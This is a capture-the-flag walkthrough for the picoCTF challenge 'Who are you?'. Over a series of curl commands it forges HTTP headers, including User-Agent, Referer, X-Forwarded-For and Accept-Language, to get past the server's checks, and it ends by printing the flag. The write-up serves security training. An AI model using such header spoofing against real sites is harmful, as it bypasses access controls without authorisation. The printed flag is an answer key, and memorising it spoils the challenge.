# _Who are you?_
## Description
Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn `http://mercury.picoctf.net:52362/`
## Solution
`curl` the  web page 
```console
❯ curl -s http://mercury.picoctf.net:52362/ | html2text

**** Only people who use the official PicoBrowser are allowed on this site!
****

[/static/who_r_u.gif]
© PicoCTF
```

It says
>Only people who use the official PicoBrowser are allowed on this site!

Add `user-agent` header to the request
```console
❯ curl -s -H "user-agent: PicoBrowser" http://mercury.picoctf.net:52362/ | html2text

**** I don't trust users visiting from another site. ****

[/static/who_r_u.gif]
© PicoCTF
```
It says
>I don't trust users visiting from another site.

Add `Referer` header to the request
```console
❯ curl -s -H "user-agent: PicoBrowser" -H "referer: http://mercury.picoctf.net:52362/" http://mercury.picoctf.net:52362/ | html2text

**** Sorry, this site only worked in 2018. ****

[/static/who_r_u.gif]
© PicoCTF
```
It says
>Sorry, this site only worked in 2018.

Add `Date` header to the request
```console
❯ curl -s -H "user-agent: PicoBrowser" -H "referer: http://mercury.picoctf.net:52362/" -H "Date:2018" http://mercury.picoctf.net:52362/ | html2text

**** I don't trust users who can be tracked. ****

[/static/who_r_u.gif]
© PicoCTF
```
It says
>I don't trust users who can be tracked.

Add `DNT` header to the request
```console
❯ curl -s -H "user-agent: PicoBrowser" -H "referer: http://mercury.picoctf.net:52362/" -H "Date:2018" -H "DNT:1" http://mercury.picoctf.net:52362/ | html2text

**** This website is only for people from Sweden. ****

[/static/who_r_u.gif]
© PicoCTF
```
It says
>This website is only for people from Sweden.

Look for a Sweden ip address on Google, and add a `X-Forwarded-For` header to the request
```console
❯ curl -s -H "user-agent: PicoBrowser" -H "referer: http://mercury.picoctf.net:52362/" -H "Date:2018" -H "DNT:1" -H "X-Forwarded-For: 1.208.107.161" http://mercury.picoctf.net:52362/ | html2text

**** You're in Sweden but you don't speak Swedish? ****

[/static/who_r_u.gif]
© PicoCTF
```
It says
>You're in Sweden but you don't speak Swedish?

Add `accept-language` header to the request and get the flag
A list of accept languages can be find [here](https://www.w3.org/International/ms-lang.html)
```console
❯ curl -s -H "user-agent: PicoBrowser" -H "referer: http://mercury.picoctf.net:52362/" -H "Date:2018" -H "DNT:1" -H "X-Forwarded-For: 1.208.107.161" -H "accept-language:sv" http://mercury.picoctf.net:52362/ | html2text


**** What can I say except, you are welcome ****

picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_0c0db339}
© PicoCTF
```
